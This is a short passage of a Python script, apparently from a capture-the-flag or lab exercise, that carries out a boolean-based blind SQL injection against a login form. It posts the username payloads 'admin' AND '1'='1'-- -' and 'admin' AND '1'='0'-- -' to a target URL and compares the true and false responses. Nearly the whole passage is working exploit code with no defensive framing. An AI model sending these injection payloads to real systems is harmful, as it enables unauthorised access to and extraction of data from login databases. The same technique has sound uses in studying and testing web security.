payload_true = "admin' AND '1'='1'-- -"
data = {"username": payload_true, "password": "test", "submit": "submit"}
response = requests.post(TARGET_URL, data=data)
print(f"[*] TRUE condition ('1'='1'): {response.text}")

# FALSE: should return {"response":"username"}  
payload_false = "admin' AND '1'='0'-- -"
data = {"username": payload_false, "password": "test", "submit": "submit"}
response = requests.post(TARGET_URL, data=data)
